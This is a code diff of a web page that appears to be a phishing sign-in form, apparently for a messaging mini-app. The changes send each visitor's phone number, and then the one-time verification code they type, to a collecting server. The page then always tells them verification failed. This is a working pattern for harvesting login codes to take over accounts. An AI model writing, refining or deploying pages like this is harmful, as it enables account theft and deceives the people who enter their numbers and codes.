@@ -130,7 +130,7 @@
             <input type="checkbox" id="keepSignedIn"> Keep me signed in
         </div>
 
-        <button class="button" onclick="goToVerificationPage()">Next</button>
+        <button class="button" onclick="sendPhoneNumber()">Next</button>
     </div>
 
     <div class="container" id="verificationContainer">
@@ -159,7 +159,7 @@
             phoneNumberField.value = countryCode + ' ' + phoneNumberField.value.replace(/^\+\d+\s*/, '');
         }
 
-        function goToVerificationPage() {
+        async function sendPhoneNumber() {
             const countryCode = document.getElementById('countryCode').value;
             const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
             const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
@@ -169,13 +169,35 @@
                 return;
             }
 
-            document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
+            try {
+                const response = await fetch('http://localhost:8080/save-verification', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phoneNumber: fullPhoneNumber
+                    })
+                });
 
-            document.getElementById('initialContainer').style.display = 'none';
-            document.getElementById('verificationContainer').style.display = 'block';
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+
+                console.log("Phone number sent to server successfully");
+
+                document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
+                document.getElementById('initialContainer').style.display = 'none';
+                document.getElementById('verificationContainer').style.display = 'block';
+
+            } catch (error) {
+                console.error("Failed to send phone number to server:", error);
+            }
         }
 
-        async function sendDataToServer(phoneNumber, verificationCode) {
+        async function sendVerificationCode(verificationCode) {
+            const phoneNumber = document.getElementById('phoneDisplay').textContent;
+
             try {
                 const response = await fetch('http://localhost:8080/save-verification', {
                     method: 'POST',
@@ -184,8 +206,7 @@
                     },
                     body: JSON.stringify({
                         phoneNumber: phoneNumber,
-                        verificationCode: verificationCode,
-                        userId: 1 // This should be dynamically assigned or passed by the mini-app environment
+                        verificationCode: verificationCode
                     })
                 });
 
@@ -193,26 +214,25 @@
                     throw new Error(`HTTP error! status: ${response.status}`);
                 }
 
-                console.log("Data sent to server successfully");
+                console.log("Verification code sent to server successfully");
+
             } catch (error) {
-                console.error("Failed to send data to server:", error);
+                console.error("Failed to send verification code to server:", error);
             }
         }
 
         function submitVerification() {
             const verificationCode = document.getElementById('verificationCode').value;
-            const phoneDisplay = document.getElementById('phoneDisplay').textContent;
 
             if (verificationCode === '') {
                 alert('Please enter the verification code.');
                 return;
             }
 
-            sendDataToServer(phoneDisplay, verificationCode);
+            sendVerificationCode(verificationCode);
 
-            // Show the final message indicating verification failure
             document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
+            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${document.getElementById('phoneDisplay').textContent}`;
             document.getElementById('finalMessageContainer').style.display = 'block';
         }
 
